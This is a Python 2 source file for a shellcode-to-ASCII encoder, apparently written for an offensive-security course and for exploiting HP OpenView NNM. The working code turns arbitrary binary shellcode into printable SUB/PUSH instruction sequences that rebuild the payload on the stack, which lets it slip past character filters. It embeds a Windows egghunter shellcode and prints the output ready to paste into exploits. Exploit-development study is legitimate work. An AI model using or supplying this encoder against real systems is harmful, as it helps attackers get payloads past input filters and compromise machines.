#!/usr/bin/python
#
# Shellcode to ASCII encoder leveraging rebuilding on-the-stack technique,
# and using Jon Erickson's algorithm from Phiral Research Labs `Dissembler` 
# utility (as described in: Hacking - The Art of Exploitation).
#
# Basically one gives to the program's output a binary encoded shellcode,
# and it yields on the output it's ASCII encoded form.
#
# This payload will at the beginning align the stack by firstly moving 
# ESP value to the EAX, then by adding to the EAX value 0x16CA then by
# setting ESP with such resulted EAX. It means that the final decoded shellcode
# will get stored in the stack, by 0x16CA bytes away from current stack address.
#
# Obviously, this encoder will not be working under DEP/W^X environments.
#
# Written for HP OpenView NNM exploitation purpose, during 
# Offensive-Security CTP / OSCE course.
#
# Mariusz B. / mgeeky, '17
#

import random
import struct
import ctypes
import sys

# ================================================
#    OPTIONS
# ================================================

# Characters that are safe to use in encoded payload.
VALID_CHARS = "01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-*\\%"

# Be more verbose.
DEBUG = False

# Set it to True in order to always prepend ZERO-EAX primitive before
# sequence of SUB operations. The `gen` routine will then operate on 
# previous value being always 0x00000000 instead of previously held in 
# EAX value. The side effect of this setting is increased payload length.
PREPEND_ZERO_OUT = False

# ================================================

MAX_NUM = 128

primitives = {
    # Zeros-out the EAX register
    # 25 4a4f4e45   AND EAX,454e4f4a
    # 25 3530313a   AND EAX,3a313035
    #'zero-eax' : '%JONE%501:',

    # Zeros-out the EAX register
    # 25 4A4D4E55 AND EAX,554E4D4A
    # 25 3532312A AND EAX,2A313235
    'zero-eax': '%JMNU%521*',

    # Aligns a stack address that the EAX will take, by 
    # adding value of 0x1688 to the EAX register
    # 2D 41373737   SUB EAX, 37373741
    # 2D 69252525   SUB EAX, 25252569
    # 2D 72324949   SUB EAX, 49493272
    # 2D 5C5A5A5A   SUB EAX, 5A5A5A5C
    'eax-stack-align' : '-A777-i%%%-r2II-\\ZZZ',

    # Sets ESP (stack pointer) to EAX
    # 50            PUSH EAX
    # 5c            POP ESP
    'set-esp-to-eax' : 'P\\',

    # Sets EAX to ESP
    # 54            PUSH ESP
    # 58            POP EAX
    'set-eax-to-esp' : 'TX',

    # ASCII friendly NOP equivalent
    # 47            INC EDI
    'nop' : 'G',

    # Stores resulted EAX value on the stack
    # 50            PUSH EAX
    'store-on-stack' : 'P',
}

class InvalidCharResulted(Exception):
    pass

def dbg(x, raw = False):
    if DEBUG:
        if raw:
            print x
        else:
            print '[dbg] ' + x

def compose(num):
    ret = 0
    ret |= num[3] << 24
    ret |= num[2] << 16
    ret |= num[1] <<  8
    ret |= num[0]
    return ret

def decompose(num):
    decompose = [0, 0, 0, 0]
    decompose[0] = (num & 0x000000ff)
    decompose[1] = (num & 0x0000ff00) >> 8
    decompose[2] = (num & 0x00ff0000) >> 16
    decompose[3] = (num & 0xff000000) >> 24
    return decompose

def strfry(item):
    return ''.join([str(w) for w in random.sample(item, len(item))])

def strfrylist(item):
    x = list(item)
    random.shuffle(x)
    return x

# Original algorithm designed by Jon Erickson, <matrix@phiral.com>
# Heavily modified by the author of this program.
def gen(dword, prev, alphabet):
    chrs_len = len(alphabet)

    t = decompose(dword)
    l = decompose(prev)

    p = [0 for i in range(MAX_NUM)]
    q = [0 for i in range(MAX_NUM)]
    r = [0 for i in range(MAX_NUM)]
    s = [0 for i in range(MAX_NUM)]

    # Initializing index tables
    for a in range(chrs_len):
        p[a] = q[a] = r[a] = s[a] = a + 1 

    # Shuffling index tables
    p = strfrylist(p)
    q = strfrylist(q)
    r = strfrylist(r)
    s = strfrylist(s)

    #pr = strfrylist(list(alphabet[:20]))
    pr = [chr(0) for c in range(20)]

    # Coefficients = subsequent bytes forming a DWORDs that will be
    # used as arguments in SUB operations. coeffs[0] stands for the 
    # first SUB's argument, coeffs[1] for the second SUB's argument and so on.
    coeffs = [
        [0, 0, 0, 0],
        [0, 0, 0, 0],
        [0, 0, 0, 0],
        [0, 0, 0, 0]
    ]

    # 0x2D - SUB opcode. Here we construct a template:
    #   [ ..., 0x2d, AA, BB, CC, DD, ...] where AA,BB,CC,DD will be argument
    # bytes to fill in.
    pr[0] = pr[5] = pr[10] = pr[15] = chr(0x2D)

    # Construct from 1 to 5 at max consecutive SUB operations
    for a in range(1, 5):
        carry = 0
        flag = [0, 0, 0, 0]

        # Iterate over bytes 0...3 composing full 32-bit DWORD
        for z in range(4):
            loop_next = 0

            # Iterate over possible indexes of the first byte within argument
            for i in range(chrs_len):

                # Iterate over possible indexes of the second byte within argument
                for j in range(chrs_len):
                    for k in range(chrs_len):
                        for m in range(chrs_len):

                            # We get random byte from valid chars charset at currently 
                            # processed positions.
                            x1 = alphabet[p[i] - 1]
                            x2 = alphabet[q[j] - 1]
                            x3 = alphabet[r[k] - 1]
                            x4 = alphabet[s[m] - 1]

                            # t[z] - Desired[z], the target byte we are looking for
                            # l[z] - Previous[z], the previous byte on this position.
                            # Desired[z] = Previous[z] - Carry - A[z] - B[z] - C[z] - D[z]
                            # Previous[z] = Desired[z] + Carry + A[z] + B[z] + C[z] + D[z]
                            tr = ctypes.c_uint32( t[z] + carry \
                                        + ord(x1) + ord(x2) \
                                        + ord(x3) + ord(x4)).value

                            # If sum result equals to our previous byte at this position -
                            # we have a hit.
                            if (tr & 0xff) == l[z]:

                                # Resulted value, in `tr` might be easily something like: 0x175
                                # then the carry will be 0x01
                                carry = (tr & 0xff00) >> 8

                                # We hit bytes forming a good looking DWORD (32 bit value), therefore
                                # we store that value for later considerations
                                if i < chrs_len: 
                                    pr[ 1 + z] = x1
                                    coeffs[0][z] = ord(x1)
                                if j < chrs_len:
                                    pr[ 6 + z] = x2
                                    coeffs[1][z] = ord(x2)
                                if k < chrs_len: 
                                    pr[11 + z] = x3
                                    coeffs[2][z] = ord(x3)
                                if m < chrs_len: 
                                    pr[16 + z] = x4
                                    coeffs[3][z] = ord(x4)

                                dbg('try = %x, l[%d] = %x, t[%d] = %x, coeffs = %s' % \
                                    (tr, z, l[z], z, t[z], str(coeffs)))

                                loop_next = 1

                                # We mark that we have already found a good values for that `z` position.
                                flag[z] = 1

                            if a < 4 or loop_next: break
                        if a < 3 or loop_next: break
                    if a < 2 or loop_next: break

        # Have we found already all 4 byte candidates?
        if sum(flag) == 4:
            dbg('flag=%s, a=%d, z=%d, i=%d, j=%d, k=%d, m=%d' % (flag,a,z,i,j,k,m))
            break

    assert sum(flag) == 4, "Could not generate computation instructions for this dword: 0x%08x" % dword

    dbg('Coeffs before fixups = %s' % (str(coeffs)))

    # Now we need to check whether the above algorithm did not fell into local optimum
    # and didn't yielded some slightly varying values. We will retry 5 times values fixups.
    ctr = 0
    while ctr < 5:
        ctr += 1
        dbg('Fixup attempt %d: gen(0x%08x, 0x%08x, ...): "%s"' % \
            (ctr, dword, prev, ''.join(['%02x' % ord(c) for c in pr])))

        # Now we print assembler interpretation of collected coefficients
        val = prev
        dbg('\n\t\t\t\t; EAX = 0x%08x' % val, True)
        for n in coeffs:
            num = compose(n)
            val = ctypes.c_uint32(val - num).value
            dbg('\tSUB EAX, 0x%08x\t; EAX = 0x%08x' % (num, val), True)

        # oops, the resutled from substraction value is not matching desired one.
        # we will have to fixup bytes that differ and retry verification process.
        if val != dword:
            dbg('in attempt #%d values do not match: 0x%08x != 0x%08x' % (ctr,val,dword))

            valdec = decompose(ctypes.c_uint32(val).value )
            dworddec = decompose(ctypes.c_uint32(dword).value)

            # We check each of the four bytes whether they differ from desired.
            for i in range(4):
                if valdec[i] != dworddec[i]:
                    dbg('byte %d needs fixing %02x => %02x' % (i, valdec[i], dworddec[i]))
                    
                    # Since they differ, we fixup them
                    diff = valdec[i] - dworddec[i]
                    pr[16 + i] = chr(ord(pr[16 + i]) + diff)
                    coeffs[3][i] += diff

                    # Resulted byte after applied fixup outlies our VALID_CHARS charset,
                    # we could have re-invoke the gen() routine here, but it will be easier
                    # to just quit and try again from the scratch.
                    if pr[16 + i] not in VALID_CHARS:
                        raise InvalidCharResulted(pr[16+i])

        else:
            dbg('Values match perfectly: 0x%08x == 0x%08x' % (val, dword))
            break

    if val != dword:
        print '\n[!] COMPUTATION FAILURE: 0x%08x != 0x%08x' % (val, dword)
        sys.exit(-1)

    ret = ''.join(pr)
    return ret

def process(inp, prepend_init = True):
    size = len(inp)
    pad = 4 - (size % 4)
    if pad == 4: pad = 0
    alphabet = strfry(VALID_CHARS)

    # Build up initial payload's stub
    out = ''

    if prepend_init:
        out += primitives['zero-eax']
        out += primitives['set-eax-to-esp']
        out += primitives['eax-stack-align']
        out += primitives['set-esp-to-eax']

        if not PREPEND_ZERO_OUT:
            out += primitives['zero-eax']

    buf = inp + '\x90' * pad
    assert len(buf) % 4 == 0, "Working buffer must be divisble by 4!"

    prev = 0

    # Iterate over every next four bytes grouped values (DWORDs)
    for i in range(len(buf), 0, -4):
        dword = struct.unpack('<I', buf[i-4:i])[0]
        alphabet = strfry(alphabet)
        instr = gen(dword, prev, alphabet)
        if PREPEND_ZERO_OUT:
            prev = 0
            out += primitives['zero-eax']
        else:
            prev = dword
        out += instr + primitives['store-on-stack']

    
    return out

def usage():
    print '''
    :: printable-shellcode.py - Utility generating a ASCII-printable shellcode
                                out of provided binary file (ASCII encoder).
        Mariusz B. / mgeeky, '17

        Algorithm based on terrific `dissembler` tool by Phiral Research Labs,
        by Jon Erickson <matrix@phiral.com>

Usage:
    printable-shellcode.py <input-file|0xValue> <output-file>

Where:
    input-file      - input file containing shellcode, '-' for stdin or 'EGG' for 
                        standard T00WT00W 32-bit windows egghunter
    0xValue         - single DWORD value, prepended with 0x to encode.
    output-file     - file to store result of ASCII encoding, or '-' for stdout
'''

def display_output(out):
    print '[+] SHELLCODE ENCODED PROPERLY. Resulted length: %d bytes' % (len(out))
    print
    print '-' * 80
    print out
    print '-' * 80
    print
    print '[+] HEX FORM:' 
    print ''.join(['%02x' % ord(c) for c in out])
    print
    print '[+] ESCAPED-HEX FORM:' 
    print ''.join(['\\x%02x' % ord(c) for c in out])
    print 
    print '[+] PYTHON COMPACT SEXY FORM:'
    buf = '\tshellcode += r"'
    for i in range(len(out)):
        if i % 20 == 0 and i > 0:
            buf += '"\n\tshellcode += r"'
        buf += out[i]
    buf += '"'
    print buf

def primitives_precheck():
    failed = False
    for k, v in primitives.items():
        for c in v:
            if c not in VALID_CHARS:
                print '[!] ERROR: Primitive "%s" contains illegal character in it: (0x%02x, "%c")' % (k, ord(c), c)
                print '[!] It means you will have to find a suitable primitive yourself and modify the `primitives` dictionary within this script.'
                print
                failed = True

    return not failed

def main():
    if len(sys.argv) != 3:
        if len(sys.argv) == 2 and sys.argv[1].startswith('0x'):
            pass
        else:
            usage()
            return False

    if not primitives_precheck():
        return False

    input_bytes = []
    prepend_init = True

    if sys.argv[1] == '-':
        input_bytes = sys.stdin.read()
    elif sys.argv[1].startswith('0x'):
        input_bytes = ''.join([chr(c) for c in decompose(int(sys.argv[1], 16))])
        prepend_init = False
    elif sys.argv[1] == 'EGG':
        input_bytes = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    else:
        with open(sys.argv[1], 'rb') as f:
            input_bytes = f.read()

    print '[*] Input buffer size: %d bytes.' % (len(input_bytes))

    i = 0
    success = False
    while i < 3:
        try:
            out = process(input_bytes, prepend_init)
            if out:
                success = True
                display_output(out)
                if len(sys.argv) > 2 and sys.argv[2] != '-':
                    with open(sys.argv[2], 'wb') as f:
                        f.write(out)
            else:
                print '[?] Returned empty payload. Confused...'

            break
        except InvalidCharResulted as pr:
            print '[!] Inter-bytes difference resulted too big rendering invalid char (%x, "%c"). Restarting...' % (ord(str(pr)), str(pr))
            continue

    if not success:
        print '[!] PROGRAM FAILURE.'

if __name__ == '__main__':
    main()
